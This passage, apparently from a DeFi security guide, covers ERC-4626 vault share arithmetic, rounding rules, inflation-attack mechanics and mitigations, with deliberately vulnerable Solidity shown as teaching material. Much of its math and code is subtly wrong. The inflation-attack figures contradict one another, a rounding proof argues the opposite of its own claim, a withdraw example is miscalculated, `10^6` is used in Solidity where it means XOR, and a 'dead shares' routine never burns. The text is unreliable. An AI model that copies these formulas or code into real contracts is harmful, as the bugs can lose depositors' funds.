        vault.withdraw(1);
        // Gets 1000 + (1000/1) = 2000 tokens profit!
    }
}
```

### Mitigation Strategies

1. **Initialization Protection**
   ```solidity
   pragma solidity ^0.8.0;

   contract InitializedVault {
       IERC20 public asset;
       uint256 public totalSupply;
       mapping(address => uint256) public balanceOf;
       bool private initialized;

       function deposit(uint256 assets) external returns (uint256 shares) {
           if (totalSupply == 0) {
               // PROTECTION: Mint minimum shares to prevent inflation
               require(assets >= 1e6, "Deposit too small on initialization");
               shares = assets - 1e6; // Burn some shares
               balanceOf[address(0)] += 1e6; // Dead shares
           } else {
               shares = (assets * totalSupply) / asset.balanceOf(address(this));
           }

           require(shares > 0, "Zero shares");

           asset.transferFrom(msg.sender, address(this), assets);
           balanceOf[msg.sender] += shares;
           totalSupply += shares;
       }
   }
   ```

2. **Minimum Shares and Assets**
   ```solidity
   pragma solidity ^0.8.0;

   contract MinimumProtectedVault {
       uint256 constant MIN_SHARE_AMOUNT = 1e6; // 1 million shares

       function deposit(uint256 assets) external returns (uint256 shares) {
           if (totalSupply == 0) {
               shares = assets * MIN_SHARE_AMOUNT / 1e18;
               require(shares >= MIN_SHARE_AMOUNT, "Deposit too small");
           } else {
               shares = (assets * totalSupply) / asset.balanceOf(address(this));
               require(shares > 0, "Zero shares");
           }

           asset.transferFrom(msg.sender, address(this), assets);
           balanceOf[msg.sender] += shares;
           totalSupply += shares;
       }
   }
   ```

3. **Virtual Offset**
   ```solidity
   pragma solidity ^0.8.0;

   contract VirtualOffsetVault {
       uint256 internal constant OFFSET = 1e6;

       function deposit(uint256 assets) external returns (uint256 shares) {
           // Add virtual offset to prevent price manipulation
           uint256 virtualAssets = asset.balanceOf(address(this)) + OFFSET;

           if (totalSupply == 0) {
               shares = assets;
           } else {
               // virtualAssets includes the offset
               shares = (assets * (totalSupply + OFFSET)) / virtualAssets;
           }

           asset.transferFrom(msg.sender, address(this), assets);
           balanceOf[msg.sender] += shares;
           totalSupply += shares;
       }
   }
   ```

4. **ERC4626 Standard (Recommended)**
   ```solidity
   pragma solidity ^0.8.0;

   import "@openzeppelin/contracts/token/ERC4626/ERC4626.sol";

   contract SafeVault is ERC4626 {
       constructor(IERC20 asset_) ERC4626(asset_) {}

       // ERC4626 includes built-in protection against inflation attacks
       // Uses standardized share calculation with safety checks
   }
   ```

---

## Summary: Best Practices for DeFi Security

### 1. Code Review Checklist
- [ ] Use Solidity 0.8.0 or higher (built-in overflow protection)
- [ ] Check for reentrancy vulnerabilities (use CEI pattern)
- [ ] Validate all external calls and return values
- [ ] Implement access control on privileged functions
- [ ] Use multiple price oracle sources (don't trust single source)
- [ ] Implement slippage protection on swaps
- [ ] Check for signature replay vulnerabilities (nonce, chainId)
- [ ] Validate input parameters and state assumptions
- [ ] Use SafeMath or rely on 0.8.0+ built-in checks
- [ ] Implement circuit breakers and pause mechanisms

### 2. Testing Strategy
- Fuzz testing (Echidna, Foundry)
- Static analysis (Slither, Mythril)
- Formal verification (Certora)
- Unit and integration tests
- Adversarial testing (try to break it!)
- Gas optimization testing

### 3. Deployment Checklist
- [ ] Get professional audit
- [ ] Implement upgrade mechanism (proxy pattern)
- [ ] Use time-locks for governance
- [ ] Implement pause/emergency mechanisms
- [ ] Set up monitoring and alerting
- [ ] Have incident response plan
- [ ] Gradual rollout with limited TVL
- [ ] Multi-sig control for critical functions

### 4. Monitoring and Alerts
- Price deviation alerts
- Unusual transaction patterns
- Access control events
- Large withdrawal/transfer events
- Governance proposal alerts
- Gas price spikes
- MEV detection

---

## Tools and Resources

### Security Tools
- **Slither**: Static analysis tool by Trail of Bits
- **Mythril**: EVM bytecode analysis
- **Echidna**: Fuzzing tool for smart contracts
- **Certora Prover**: Formal verification platform
- **Manticore**: Symbolic execution tool
- **Etherscan**: View contract code and transactions
- **OpenZeppelin Defender**: Monitoring and automation

### Resources
- OpenZeppelin Contracts: https://github.com/OpenZeppelin/openzeppelin-contracts
- Consensys Smart Contract Best Practices: https://consensys.github.io/smart-contract-best-practices/
- SWC Registry: https://swcregistry.io/
- Awesome DeFi: https://github.com/ong/awesome-decentralized-finance

---

## References

- Solidity Documentation: https://docs.soliditylang.org/
- Ethereum Yellow Paper
- EIPs (Ethereum Improvement Proposals)
- Academic papers on blockchain security
- Real audit reports and post-mortems
- MythX Documentation
- Uniswap V2/V3 Audits
- Yearn Finance Security Docs

---

**Last Updated**: 2024
**Contribution**: Please contribute improvements and additional attack vectors!

---

# Part 2: ERC-4626 Vault Mathematics

# ERC-4626 Vault Mathematics Reference

## Complete Guide to Tokenized Vault Mathematics

A comprehensive reference for understanding, implementing, and debugging the mathematical foundations of ERC-4626 tokenized vaults.

---

## Table of Contents

1. [Fundamental Concepts](#fundamental-concepts)
2. [Core Share Calculation Formulas](#core-share-calculation-formulas)
3. [Asset-to-Shares Conversion](#asset-to-shares-conversion)
4. [Rounding Modes](#rounding-modes)
5. [Function Specifications](#function-specifications)
6. [Deposit vs Mint Differences](#deposit-vs-mint-differences)
7. [Withdraw vs Redeem Differences](#withdraw-vs-redeem-differences)
8. [Inflation Attack Vectors](#inflation-attack-vectors)
9. [Edge Cases and Singularities](#edge-cases-and-singularities)
10. [Mathematical Proofs](#mathematical-proofs)
11. [Common Implementation Mistakes](#common-implementation-mistakes)
12. [Flow Diagrams](#flow-diagrams)
13. [Example Calculations](#example-calculations)
14. [Implementation Checklist](#implementation-checklist)

---

## Fundamental Concepts

### The Share System

ERC-4626 vaults operate on a **two-token system**:

1. **Underlying Asset (ERC-20)**: The actual asset deposited by users (e.g., USDC, DAI, WETH)
2. **Vault Shares (ERC-20)**: Proportional claims on the underlying assets

### The Core Relationship

```
Total Assets
─────────────── = Share Price
Total Shares
```

This ratio determines how much underlying asset each share represents.

### Key Variables

```solidity
totalAssets()   // Total amount of underlying asset in vault
totalSupply()   // Total number of shares issued
balanceOf(user) // Number of shares owned by user
```

### The Exchange Rate

```
Exchange Rate = Total Assets / Total Shares
```

In scaled mathematics (with decimals):

```
Exchange Rate = (Total Assets × 10^18) / Total Shares
```

---

## Core Share Calculation Formulas

### Formula 1: Assets to Shares

**Converting underlying assets to vault shares:**

```
shares = assets × totalSupply() / totalAssets()
```

Or with scaling factor `E`:

```
shares = (assets × totalSupply() × E) / (totalAssets() × E)
```

**Intuition**: If you have 100 assets and there are 1000 shares worth 100 assets total, your 100 assets = 1000 shares.

### Formula 2: Shares to Assets

**Converting vault shares to underlying assets:**

```
assets = shares × totalAssets() / totalSupply()
```

**Intuition**: If each share is worth 0.1 assets, then 1000 shares = 100 assets.

### Formula 3: Shares Created (After Deposit)

**When depositing `depositAmount` assets:**

```
sharesReceived = depositAmount × totalSupply() / totalAssets()
```

If totalAssets = 0 (empty vault):

```
sharesReceived = depositAmount × 10^decimalPlaces
```

The decimal places ensure 1-to-1 ratio at initialization.

### Formula 4: Assets Withdrawn (After Redeem)

**When redeeming `shareAmount` shares:**

```
assetsReceived = shareAmount × totalAssets() / totalSupply()
```

---

## Asset-to-Shares Conversion

### The Conversion Mechanism

```
┌─────────────────────┐
│  User has Assets    │
│      (e.g., 100)    │
└──────────┬──────────┘
           │
           │ Convert using formula:
           │ shares = assets × totalSupply / totalAssets
           │
           ▼
┌─────────────────────┐
│   User has Shares   │
│     (e.g., 1000)    │
└─────────────────────┘
```

### Step-by-Step Conversion

**Scenario**: User deposits 50 USDC into a vault with:
- totalAssets = 1000 USDC
- totalSupply = 500 shares

**Calculation**:
```
shares = 50 × 500 / 1000
shares = 25000 / 1000
shares = 25 shares
```

The user receives **25 shares** for their 50 USDC deposit.

### Reverse Conversion (Shares to Assets)

**Scenario**: User redeems 25 shares from the same vault

**Calculation**:
```
assets = 25 × 1000 / 500
assets = 25000 / 500
assets = 50 USDC
```

The user receives **50 USDC** back.

---

## Rounding Modes

### Why Rounding Matters

In vault mathematics, every calculation produces potential fractional tokens. Since blockchains use integers, we must round decisively.

**Rounding direction is critical for security and fairness:**

- **Round DOWN**: Protects the vault; users receive less
- **Round UP**: Protects users; vault receives less

### Rule of Thumb

```
Favor the vault (round against user) in calculations that:
- Determine how much the user RECEIVES
- Represent vault OUTFLOWS

Favor the user (round with user) in calculations that:
- Determine how much the user PAYS
- Represent vault INFLOWS
```

### Implementation in Solidity

**Round DOWN (Integer Division)**:
```solidity
// In Solidity, integer division automatically rounds down
shares = assets * totalSupply / totalAssets;  // Rounds DOWN
```

**Round UP**:
```solidity
// Manually round up using ceiling division
shares = (assets * totalSupply + totalAssets - 1) / totalAssets;

// Or more clearly:
shares = (assets * totalSupply) / totalAssets;
if ((assets * totalSupply) % totalAssets != 0) {
    shares += 1;
}
```

### Rounding in ERC-4626 Functions

| Function | Conversion | Direction | Why |
|----------|-----------|-----------|-----|
| `deposit()` | Assets → Shares | DOWN | User receives less when depositing (protects vault) |
| `mint()` | Shares → Assets | UP | Vault receives more assets when minting shares (protects vault) |
| `withdraw()` | Assets → Shares | UP | Vault receives more shares when withdrawing (user pays more) |
| `redeem()` | Shares → Assets | DOWN | User receives less assets when redeeming (protects vault) |

---

## Function Specifications

### 1. `deposit(uint256 assets, address receiver)`

**Purpose**: User specifies amount of assets to deposit

**Returns**: Shares received

**Formula**:
```
sharesOut = assets × totalSupply / totalAssets
```

**Rounding**: DOWN

**Code Template**:
```solidity
function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
{
    require(assets > 0, "Zero amount");
    require(receiver != address(0), "Zero address");

    // Calculate shares (rounds down)
    shares = convertToShares(assets);

    // Transfer assets from user to vault
    asset.transferFrom(msg.sender, address(this), assets);

    // Mint shares to receiver
    _mint(receiver, shares);

    emit Deposit(msg.sender, receiver, assets, shares);
}
```

**Special Case - First Deposit**:
```
If totalAssets == 0:
    shares = assets × 10^decimalPlaces
```

### 2. `mint(uint256 shares, address receiver)`

**Purpose**: User specifies number of shares they want

**Returns**: Assets required

**Formula**:
```
assetsIn = shares × totalAssets / totalSupply
```

**Rounding**: UP

**Code Template**:
```solidity
function mint(uint256 shares, address receiver)
    external
    returns (uint256 assets)
{
    require(shares > 0, "Zero amount");
    require(receiver != address(0), "Zero address");

    // Calculate assets needed (rounds up)
    assets = convertToAssets(shares);
    if ((shares * totalAssets) % totalSupply != 0) {
        assets += 1;
    }

    // Transfer assets from user to vault
    asset.transferFrom(msg.sender, address(this), assets);

    // Mint exact shares to receiver
    _mint(receiver, shares);

    emit Deposit(msg.sender, receiver, assets, shares);
}
```

### 3. `withdraw(uint256 assets, address receiver, address owner)`

**Purpose**: User specifies amount of assets to withdraw

**Returns**: Shares burned

**Formula**:
```
sharesBurned = assets × totalSupply / totalAssets
```

**Rounding**: UP (user pays more)

**Code Template**:
```solidity
function withdraw(
    uint256 assets,
    address receiver,
    address owner
) external returns (uint256 shares) {
    require(assets > 0, "Zero amount");
    require(receiver != address(0), "Zero address");

    // Calculate shares needed (rounds up, user pays more)
    shares = convertToShares(assets);
    if ((assets * totalSupply) % totalAssets != 0) {
        shares += 1;
    }

    // Burn shares from owner
    if (msg.sender != owner) {
        _approve(owner, msg.sender, allowance[owner][msg.sender] - shares);
    }
    _burn(owner, shares);

    // Transfer assets to receiver
    asset.transfer(receiver, assets);

    emit Withdraw(msg.sender, receiver, owner, assets, shares);
}
```

### 4. `redeem(uint256 shares, address receiver, address owner)`

**Purpose**: User specifies number of shares to redeem

**Returns**: Assets received

**Formula**:
```
assetsOut = shares × totalAssets / totalSupply
```

**Rounding**: DOWN (user receives less)

**Code Template**:
```solidity
function redeem(
    uint256 shares,
    address receiver,
    address owner
) external returns (uint256 assets) {
    require(shares > 0, "Zero amount");
    require(receiver != address(0), "Zero address");

    // Calculate assets (rounds down)
    assets = convertToAssets(shares);

    // Burn shares from owner
    if (msg.sender != owner) {
        _approve(owner, msg.sender, allowance[owner][msg.sender] - shares);
    }
    _burn(owner, shares);

    // Transfer assets to receiver
    asset.transfer(receiver, assets);

    emit Withdraw(msg.sender, receiver, owner, assets, shares);
}
```

### 5. Preview Functions

**Purpose**: Read-only calculations of what operations would return

```solidity
// How many shares for assets?
function previewDeposit(uint256 assets)
    external
    view
    returns (uint256 shares)
{
    return convertToShares(assets);
}

// How many assets for shares?
function previewMint(uint256 shares)
    external
    view
    returns (uint256 assets)
{
    assets = (shares * totalAssets) / totalSupply;
    if ((shares * totalAssets) % totalSupply != 0) {
        assets += 1;
    }
    return assets;
}

// How many shares to burn for assets?
function previewWithdraw(uint256 assets)
    external
    view
    returns (uint256 shares)
{
    shares = (assets * totalSupply) / totalAssets;
    if ((assets * totalSupply) % totalAssets != 0) {
        shares += 1;
    }
    return shares;
}

// How many assets for shares?
function previewRedeem(uint256 shares)
    external
    view
    returns (uint256 assets)
{
    return convertToAssets(shares);
}
```

**Critical Requirement**: Preview functions MUST return the EXACT same result as their corresponding state-changing functions, including rounding direction.

---

## Deposit vs Mint Differences

### The Key Distinction

Both `deposit()` and `mint()` add assets to the vault and give the user shares, but they differ in what the user specifies:

| Aspect | `deposit()` | `mint()` |
|--------|-----------|---------|
| **User specifies** | Assets amount | Shares amount |
| **Vault returns** | Shares received | Assets required |
| **User certainty** | Knows exactly how much to pay | Knows exactly how many shares they get |
| **Rounding** | DOWN (user gets less) | UP (user pays more) |
| **Use case** | "I want to deposit 100 USDC" | "I want exactly 500 shares" |

### Mathematical Relationship

```
If user wants to receive X shares:
  - With deposit():  deposit(convertToAssets(X)) → X shares (approximately)
  - With mint():     mint(X) → exactly X shares

If user wants to spend Y assets:
  - With deposit():  deposit(Y) → shares (rounded down)
  - With mint():     mint(convertToShares(Y)) → shares (exact)
```

### Example: The Rounding Impact

**Scenario**: User wants to interact with a vault where:
- totalAssets = 1000
- totalSupply = 1000 (1:1 ratio)
- User has 333 assets

**Using `deposit(333)`**:
```
shares = 333 × 1000 / 1000 = 333 shares (exactly)
```

**Using `mint(333)`**:
```
assets = 333 × 1000 / 1000 = 333 assets (exactly)
```

Now consider a vault with fractional shares:

**Vault state**:
- totalAssets = 1000
- totalSupply = 999 (slightly more valuable per share)

**Using `deposit(333)`**:
```
shares = 333 × 999 / 1000 = 332.667 → 332 shares (rounds DOWN)
User loses 0.667 shares due to rounding
```

**Using `mint(333)`**:
```
assets = 333 × 1000 / 999 = 333.333 → 334 assets (rounds UP)
User pays 1 extra asset for guaranteed 333 shares
```

### When to Use Which

**Use `deposit()` when**:
- User has exact amount of assets
- Price impact of rounding is acceptable
- Simplicity is preferred

**Use `mint()` when**:
- User wants exact number of shares
- Slippage from rounding is unacceptable
- Shares represent something meaningful (governance power, etc.)

---

## Withdraw vs Redeem Differences

### The Key Distinction

Both `withdraw()` and `redeem()` remove assets from the vault and burn the user's shares, but they differ in what the user specifies:

| Aspect | `withdraw()` | `redeem()` |
|--------|------------|-----------|
| **User specifies** | Assets amount | Shares amount |
| **Vault returns** | Shares burned | Assets received |
| **User certainty** | Knows exactly how much they get | Knows exactly how many shares burn |
| **Rounding** | UP (user pays more) | DOWN (user gets less) |
| **Use case** | "I want 100 USDC back" | "I want to redeem all my shares" |

### Mathematical Relationship

```
If user wants to receive Y assets:
  - With withdraw():  withdraw(Y) → shares burned
  - With redeem():    redeem(convertToShares(Y)) → approximately Y assets

If user wants to burn X shares:
  - With withdraw():  withdraw(convertToAssets(X)) → approximately X shares
  - With redeem():    redeem(X) → exactly X shares
```

### Example: The Rounding Impact

**Scenario**: Same vault as before:
- totalAssets = 1000
- totalSupply = 999

**User wants to withdraw 500 assets**:

Using `withdraw(500)`:
```
shares = 500 × 999 / 1000 = 499.5 → 500 shares (rounds UP)
User must burn 500 shares to get 500 assets
Vault extracts 1 extra share as slippage
```

Using `redeem(500)`:
```
assets = 500 × 1000 / 999 = 500.500 → 500 assets (rounds DOWN)
User redeems 500 shares, gets 500 assets
User loses 0.500 assets to rounding
```

### When to Use Which

**Use `withdraw()` when**:
- User wants specific amount of assets
- Exact asset withdrawal is critical
- User accepts share slippage

**Use `redeem()` when**:
- User wants to redeem all shares
- Exact number of shares burned is critical
- Cleanup operations (exit vault completely)

---

## Inflation Attack Vectors

### What is an Inflation Attack?

An inflation attack in ERC-4626 occurs when an early vault depositor inflates the share price, causing subsequent depositors to receive very few or zero shares.

### Attack Mechanism

**Vulnerable Code**:
```solidity
function deposit(uint256 assets) external returns (uint256 shares) {
    // VULNERABLE: No protection against first deposit manipulation
    shares = assets * totalSupply / totalAssets;

    // ... mint shares ...
}
```

**Attack Steps**:

1. **Step 1**: Attacker deposits 1 wei of assets
   ```
   shares = 1 × 10^18 / 1 = 10^18 shares (1:1 ratio initialized)
   ```

2. **Step 2**: Attacker transfers large amount of assets directly to vault
   ```
   Vault now has: 1 + 1000000 = 1000001 wei assets
   totalSupply: 10^18 shares
   Price per share: 1000001 / 10^18 ≈ 10^-12
   ```

3. **Step 3**: Innocent user deposits 1000000 wei
   ```
   shares = 1000000 × 10^18 / 1000001 ≈ 999999000000
   User receives ~999999 shares instead of ~1000000
   Attacker's 1 original share now worth ~1000001 wei
   ```

### Attack Visualization

```
BEFORE ATTACK:
┌──────────────────────┐
│  Empty Vault         │
│  totalAssets = 0     │
│  totalSupply = 0     │
└──────────────────────┘

STEP 1 - Attacker deposits 1 wei:
┌──────────────────────┐
│  Vault               │
│  totalAssets = 1     │
│  totalSupply = 10^18 │
│  Price/share = 10^-18│
└──────────────────────┘

STEP 2 - Attacker transfers 1M wei directly:
┌──────────────────────┐
│  Vault               │
│  totalAssets = 1M+1  │
│  totalSupply = 10^18 │
│  Price/share = 1M    │
└──────────────────────┘

STEP 3 - Innocent user deposits 1M:
Calculates: 1M × 10^18 / (1M+1) ≈ 999999
Receives only 999999 shares for 1M assets!
```

### Mitigation Strategy 1: Minimum Initial Deposit

```solidity
uint256 private constant INITIAL_CHAIN_ID = 1;
bytes32 private constant INITIAL_DOMAIN_SEPARATOR = 0x...;

function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
{
    // PROTECTION: Enforce minimum initial deposit
    if (totalSupply == 0) {
        require(assets >= 10**6, "Initial deposit too small");
    }

    shares = convertToShares(assets);
    require(shares != 0, "Deposit too small");

    // ... rest of function ...
}
```

### Mitigation Strategy 2: Virtual Offset

```solidity
uint256 internal constant VIRTUAL_OFFSET = 10^6;

function convertToShares(uint256 assets)
    internal
    view
    returns (uint256 shares)
{
    // Add virtual offset to both numerator components
    uint256 totalAssetsPlusBias = totalAssets() + VIRTUAL_OFFSET;
    uint256 totalSupplyPlusBias = totalSupply() + VIRTUAL_OFFSET;

    shares = assets * totalSupplyPlusBias / totalAssetsPlusBias;
}

function convertToAssets(uint256 shares)
    internal
    view
    returns (uint256 assets)
{
    // Same bias applied
    uint256 totalAssetsPlusBias = totalAssets() + VIRTUAL_OFFSET;
    uint256 totalSupplyPlusBias = totalSupply() + VIRTUAL_OFFSET;

    assets = shares * totalAssetsPlusBias / totalSupplyPlusBias;
}
```

**How Virtual Offset Protects**:

With 10^6 offset:
```
Before: 1M assets / 0 supply → undefined
After: (1M + 10^6) / (0 + 10^6) ≈ 1.001 (shares worth ~1 asset)

Attacker's profit = ~1.001 - 1 = 0.001 assets (negligible)
Attack cost (1M transfer) >>> attack profit
```

### Mitigation Strategy 3: Dead Shares

```solidity
function initialize() external {
    require(totalSupply == 0, "Already initialized");

    // Mint and burn dead shares to prevent first deposit attack
    uint256 deadShares = 10**6;
    _mint(address(1), deadShares); // Send to unrecoverable address

    // This ensures totalSupply > 0, preventing share price inflation
}
```

### Comparison of Mitigations

| Strategy | Cost | Complexity | Effectiveness |
|----------|------|-----------|----------------|
| Minimum deposit | Medium | Low | Medium (users can still bypass) |
| Virtual offset | None | Low | High (automatic) |
| Dead shares | Low | Low | High (automatic) |

**Recommended**: Combine virtual offset + minimum deposit requirement for maximum safety.

---

## Edge Cases and Singularities

### Case 1: Empty Vault (totalAssets = 0, totalSupply = 0)

**The Problem**: Division by zero

```
shares = assets × 0 / 0  // Undefined!
```

**Solution**: Define special behavior for first deposit

```solidity
function convertToShares(uint256 assets) internal view returns (uint256) {
    uint256 supply = totalSupply();

    if (supply == 0) {
        // First deposit: 1:1 ratio at decimal precision
        return assets * 10**decimals() / 10**asset.decimals();
    }

    return assets * supply / totalAssets();
}
```

**Example**:
- User deposits 100 USDC (6 decimals)
- Shares have 18 decimals
- Shares received: 100 × 10^18 / 10^6 = 10^14 shares

### Case 2: Zero Assets Remaining

**The Problem**: What happens if vault empties?

```
If totalAssets → 0:
  assets = shares × 0 / totalSupply = 0

All remaining shares become worthless!
```

**This is mathematically correct but operationally problematic:**

```solidity
function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
{
    assets = convertToAssets(shares);

    // This is acceptable - shares do become worthless
    require(assets > 0 || totalAssets() == 0, "Precision loss");

    // ... burn shares and transfer assets ...
}
```

### Case 3: Rounding to Zero

**The Problem**: Fractional amounts round to zero

```
User deposits 0.5 assets in vault where:
totalSupply = 1000000
totalAssets = 1000000

shares = 0.5 × 1000000 / 1000000 = 0.5 shares
Rounds DOWN to 0 shares!
```

**Solution**: Require minimum meaningful amount

```solidity
function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
{
    require(assets > 0, "Zero amount");

    shares = convertToShares(assets);
    require(shares > 0, "Deposit amount too small for this vault");

    // ... rest of function ...
}
```

### Case 4: Precision Loss on Extreme Ratios

**The Problem**: Very large or very small ratios cause precision loss

```solidity
// Scenario: totalAssets = 10^24, totalSupply = 1
// User deposits 10^6 assets

shares = 10^6 × 1 / 10^24 = 10^-18 shares
Rounds DOWN to 0 shares!
```

**Solution**: Use higher precision arithmetic

```solidity
function convertToShares(uint256 assets) internal view returns (uint256) {
    uint256 supply = totalSupply();
    uint256 total = totalAssets();

    if (supply == 0) return assets * 10**DECIMALS / 10**asset.decimals();

    // Scale up before division to avoid precision loss
    return (assets * supply * 10**18) / (total * 10**18);
}
```

### Case 5: Very Large Share Supply

**The Problem**: Multiplication overflow

```solidity
// If totalSupply ≈ 10^77 and assets ≈ 10^20
shares = assets * totalSupply / totalAssets
       = 10^20 × 10^77 / ...
       = 10^97  // OVERFLOW!
```

**Solution**: Carefully order operations

```solidity
function convertToShares(uint256 assets) internal view returns (uint256) {
    uint256 supply = totalSupply();
    uint256 total = totalAssets();

    // Divide first to avoid overflow
    if (assets < total) {
        return assets * supply / total;
    } else {
        // assets >= total, so divide assets first
        return (assets / total) * supply + (assets % total) * supply / total;
    }
}
```

---

## Mathematical Proofs

### Proof 1: Conservation of Value

**Claim**: The total value of shares always equals total assets

**Proof**:

Let's define:
- `a` = total assets
- `s` = total shares issued
- `p` = price per share = a / s

Each share is worth `p` assets.

Total value of all shares = `s × p = s × (a / s) = a`

Therefore: **Total value of shares ≡ Total assets** ✓

### Proof 2: Linear Scaling

**Claim**: If you double assets, the share price increases proportionally

**Proof**:

Original state:
- totalAssets = a
- totalSupply = s
- Price per share = a / s

If total assets double (vault gains profit):
- totalAssets = 2a
- totalSupply = s (shares unchanged)
- New price per share = 2a / s = 2 × (a / s)

Price per share **exactly doubles** ✓

This proves profit is distributed proportionally to all share holders.

### Proof 3: First Depositor Advantage is Unbounded

**Claim**: First depositor can extract arbitrary profit with standard formulas

**Proof**:

Let `d` = first deposit amount

Step 1: Deposit `d` assets
```
shares = d × 0 / 0 (undefined, we set to d)
```

Step 2: Transfer `K × d` assets directly to vault (where K >> 1)
```
totalAssets = d + K×d = d(1+K)
totalSupply = d
Price per share = d(1+K) / d = (1+K)
```

First depositor's wealth: `d × (1+K)` assets per share owned

This can be made arbitrarily large by choosing K arbitrarily large. ✓

**This proves the inflation attack works and is why mitigations are necessary.**

### Proof 4: Rounding Consistency

**Claim**: Using opposite rounding directions for inflow and outflow prevents extraction of value

**Proof**:

For a user performing deposit then immediate redeem:

Deposit:
```
shares_out = assets × supply_before / assets_before [ROUNDED DOWN]
```

Redeem:
```
assets_out = shares_out × assets_before / supply_before [ROUNDED DOWN]
```

In the best case for the user:
```
assets_out = floor(assets × supply_before / assets_before) × assets_before / supply_before
           ≤ assets × supply_before / assets_before × assets_before / supply_before
           = assets
```

So `assets_out ≤ assets_in`.

By always rounding against the user on outflows, we ensure **users cannot extract value through rounding arbitrage**. ✓

### Proof 5: Share Burning is Equivalent to Withdrawal

**Claim**: Burning shares removes corresponding assets from circulation

**Proof**:

When user redeems `s` shares where total shares = `S` and total assets = `A`:

Assets removed = `s × A / S`

After transaction:
- totalAssets = `A - (s × A / S) = A × (S - s) / S`
- totalSupply = `S - s`
- New price per share = `A × (S - s) / S / (S - s) = A / S`

**Price per share remains unchanged** ✓

This proves that redemptions don't affect other shareholders, which is the fundamental requirement of a fair vault.

---

## Common Implementation Mistakes

### Mistake 1: Incorrect Rounding Direction

```solidity
// WRONG: Using DOWN for mint (should be UP)
function mint(uint256 shares, address receiver) external returns (uint256 assets) {
    assets = shares * totalAssets / totalSupply;  // Rounds DOWN
    // Vault could receive fewer assets than expected!
}

// CORRECT:
function mint(uint256 shares, address receiver) external returns (uint256 assets) {
    assets = (shares * totalAssets + totalSupply - 1) / totalSupply;  // Rounds UP
    // Vault always receives enough assets for exact shares
}
```

**Impact**: Vault can be drained if users exploit rounding.

### Mistake 2: Not Handling Zero Division

```solidity
// WRONG: No check for empty vault
function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    shares = assets * totalSupply / totalAssets;  // Divides by 0 when empty!
}

// CORRECT:
function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    if (totalSupply == 0) {
        shares = assets * 10**decimals() / 10**asset.decimals();
    } else {
        shares = assets * totalSupply / totalAssets;
    }
}
```

**Impact**: Vault crashes on first deposit.

### Mistake 3: preview* Functions Don't Match Implementation

```solidity
// WRONG: preview and actual use different rounding
function previewMint(uint256 shares) external view returns (uint256) {
    return shares * totalAssets / totalSupply;  // Rounds DOWN (wrong!)
}

function mint(uint256 shares, address receiver) external returns (uint256 assets) {
    assets = (shares * totalAssets + totalSupply - 1) / totalSupply;  // Rounds UP
    // previewMint(100) might return 50, but mint(100) needs 51 assets!
}

// CORRECT:
function previewMint(uint256 shares) external view returns (uint256) {
    return (shares * totalAssets + totalSupply - 1) / totalSupply;  // Matches mint()
}

function mint(uint256 shares, address receiver) external returns (uint256 assets) {
    assets = (shares * totalAssets + totalSupply - 1) / totalSupply;
}
```

**Impact**: Front-running and contract integration failures.

### Mistake 4: Allowing Rounding to Zero

```solidity
// WRONG: No check for rounding to zero
function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
{
    shares = assets * totalSupply / totalAssets;
    // If shares == 0, transaction succeeds but nothing happens!
    _burn(owner, shares);  // Burns 0 shares
    asset.transfer(receiver, assets);  // Transfers assets but doesn't burn shares!
}

// CORRECT:
function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
{
    require(assets > 0, "Zero amount");
    shares = assets * totalSupply / totalAssets;
    require(shares > 0, "Rounding resulted in zero shares");
    _burn(owner, shares);
    asset.transfer(receiver, assets);
}
```

**Impact**: Assets stolen, shares not burned.

### Mistake 5: Not Protecting Against First Deposit Attack

```solidity
// WRONG: No mitigation
contract UnsafeVault {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = totalSupply == 0 ? assets : assets * totalSupply / totalAssets;
        // Attacker can still inflate share price!
    }
}

// CORRECT: Use virtual offset
contract SafeVault {
    uint256 constant VIRTUAL_OFFSET = 10**6;

    function convertToShares(uint256 assets) internal view returns (uint256) {
        return assets * (totalSupply + VIRTUAL_OFFSET) / (totalAssets + VIRTUAL_OFFSET);
    }
}
```

**Impact**: Vault susceptible to inflation attacks.

### Mistake 6: Overflow in Calculations

```solidity
// WRONG: Can overflow with large values
function convertToShares(uint256 assets) internal view returns (uint256) {
    return assets * totalSupply() / totalAssets();  // assets * totalSupply might overflow!
}

// CORRECT: Order operations to minimize risk
function convertToShares(uint256 assets) internal view returns (uint256) {
    uint256 supply = totalSupply();
    uint256 assets_bal = totalAssets();

    if (supply == 0) return assets * 10**18 / 10**6;

    // If assets is small relative to assets_bal, divide first
    if (assets <= type(uint256).max / supply) {
        return assets * supply / assets_bal;
    } else {
        // Otherwise, re-order to avoid overflow
        return (assets / assets_bal) * supply + (assets % assets_bal) * supply / assets_bal;
    }
}
```

**Impact**: Integer overflow crashes vault.

### Mistake 7: Not Adjusting for Decimal Mismatch

```solidity
// WRONG: Doesn't account for different decimals
function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    // asset might have 6 decimals, shares have 18
    // assets is given in wei of the asset
    shares = assets * totalSupply / totalAssets;
}

// CORRECT:
function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetDecimals = asset.decimals();
    uint256 shareDecimals = 18;

    if (totalSupply == 0) {
        // Scale assets to share decimals
        shares = assets * (10 ** shareDecimals) / (10 ** assetDecimals);
    } else {
        shares = assets * totalSupply / totalAssets;
    }
}
```

**Impact**: Share prices miscalculated, potential loss of funds.

---

## Flow Diagrams

### User Flow: Deposit

```
User wants to deposit 100 USDC
        ↓
User calls deposit(100 ether)  // 100 USDC in smallest units
        ↓
Vault calculates shares
shares = 100 × totalSupply / totalAssets
        ↓
Vault transfers 100 USDC from user to vault
asset.transferFrom(user, vault, 100)
        ↓
Vault mints shares to user
_mint(user, shares)
        ↓
Event emitted: Deposit(user, user, 100, shares)
        ↓
User receives shares
```

### Mathematical Flow: Deposit

```
┌────────────────────────────────────────────────┐
│ DEPOSIT FLOW                                   │
├────────────────────────────────────────────────┤
│                                                │
│  Input: assets (user has this much underlying)│
│                                                │
│  Formula: shares = assets × S / A              │
│           where S = totalSupply                │
│                 A = totalAssets                │
│  Rounding: DOWN (user receives less)           │
│                                                │
│  Output: shares (user receives this much)      │
│                                                │
│  State Changes:                                │
│  - totalAssets += assets                       │
